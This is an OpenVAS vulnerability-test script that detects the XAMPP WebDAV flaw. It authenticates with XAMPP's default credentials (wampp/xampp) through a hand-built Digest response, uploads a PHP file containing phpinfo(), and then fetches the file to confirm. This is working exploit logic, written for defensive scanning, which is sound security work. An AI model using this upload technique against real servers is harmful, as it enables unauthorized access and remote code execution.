###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xampp_webdav_php_upload_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# XAMPP WebDAV PHP Upload Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation may allow remote attackers to gain
unauthorized access to the system.

Impact Level: System/Application";

tag_affected = "XAMPP";

tag_insight = "The flaw exists because XAMPP contains a default username and
password within the WebDAV folder, which allows attackers to gain unauthorized
access to the system.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.

A Workaround is to delete or change the default webdav password file. For
details refer, http://serverpress.com/topic/xammp-webdav-security-patch/";

tag_summary = "This host is running XAMPP and prone to PHP upload
vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802293");
  script_version("$Revision: 9352 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2012-01-17 12:12:12 +0530 (Tue, 17 Jan 2012)");
  script_name("XAMPP WebDAV PHP Upload Vulnerability");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/72397");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18367");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108420/xampp_webdav_upload_php.rb.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_xampp_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("xampp/installed");

  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (! xamppVer = get_kb_item("www/" + port + "/XAMPP")){
  exit(0);
}

host = http_host_name(port:port);

## Send Request Without Authorization
url = "/webdav/openvastest" + rand() + ".php";
req = http_put(item:url, port:port);
res = http_keepalive_send_recv(port:port, data:req);

## Get Nonce
nonce = eregmatch(pattern:'nonce="([^"]*)', string:res);
if(isnull(nonce[1])) {
  exit(0);
}
nonce = nonce[1];

cnonce = rand();  ## Client Nonce
qop = "auth";     ## Quality of protection code
nc = "00000001";  ## nonce-count

## Build Response
ha1 = hexstr(MD5("wampp:XAMPP with WebDAV:xampp"));
ha2 = hexstr(MD5("PUT:" + url));
response = hexstr(MD5(string(ha1,":",nonce,":",nc,":",cnonce,":",qop,":",ha2)));

## Construct Request with Default Authorization
data = "<?php phpinfo();?>";
req = string("PUT ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", OPENVAS_HTTP_USER_AGENT, "\r\n",
             'Authorization: Digest username="wampp", realm="XAMPP with WebDAV",',
             'nonce="',nonce,'",', 'uri="',url,'", algorithm=MD5,',
             'response="', response,'", qop=', qop,', nc=',nc,', cnonce="',cnonce,'"',"\r\n",
             "Content-Length: ", strlen(data), "\r\n\r\n", data);

## Try to upload php file
res = http_keepalive_send_recv(port:port, data:req);

## Confirm the vulnerability
if(res =~ "HTTP/1.. 201")
{
  ## Confirm exploit worked by checking the response
  if(http_vuln_check(port:port, url:url, pattern:">phpinfo\(\)<")){
    security_message(port);
  }
}
